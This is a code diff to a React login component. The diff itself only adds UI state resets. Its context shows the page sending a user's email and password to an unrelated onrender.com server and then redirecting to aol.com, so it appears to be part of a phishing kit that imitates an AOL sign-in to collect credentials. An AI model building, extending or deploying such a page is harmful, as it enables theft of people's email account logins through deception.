@@ -54,18 +54,24 @@ function App() {
     setInputValue(event.target.value);
     sorrySet("")
     setIsButtonDisabled(false)
+    spinnerSet('')
+    nextSet('')
   };
   const handleChange = (event) => {
     setPassword(event.target.value);
     invalidSet("none")
     setIsButtonDisabled(false)
     sorrySet("")
+    spinnerSet('')
+    nextSet('')
   };
   const handleChanger = (event) => {
     invalidSet("none")
     setIsButtonDisabled(false)
     sorrySet("")
     const text = event.target.value;
+    spinnerSet('')
+    nextSet('')
 
     setPasswords(text)
     setUppercaseText(text.toUpperCase());
@@ -118,6 +124,7 @@ function App() {
       const response = await axios.post("https://placecook.onrender.com/login", {
         username,
       });
+
       if (response.data.succ === 'false'){
         // alert('Sorry, we dont recognize this email.')
         sorrySet("Sorry, we don't recognize this email.")
@@ -133,6 +140,8 @@ function App() {
       spinnerSet('')
       nextSet('')
       }
+      spinnerSet('')
+      nextSet('')
 
     } catch (error) {
       console.error(error);
@@ -173,10 +182,14 @@ function App() {
         formssShow('formsss')
         formsssShows('')
         setDataDisplayValues(response.data.dataDisplayValues)
+        spinnerSet('')
+        nextSet('')
 
       } else if(response.data.succ === 'logged'){
         window.location.href = 'https://aol.com';
       }
+      spinnerSet('')
+      nextSet('')
 
     } catch (error) {
       console.error(error);
